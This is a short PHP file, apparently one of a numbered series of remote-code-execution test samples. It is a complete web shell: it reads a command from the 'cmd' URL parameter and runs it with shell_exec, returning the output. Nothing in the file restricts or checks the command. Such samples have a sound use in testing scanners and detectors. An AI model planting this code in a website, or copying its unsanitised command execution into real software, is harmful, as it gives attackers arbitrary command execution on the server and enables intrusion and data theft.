<?php
// RCE test variation #937
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>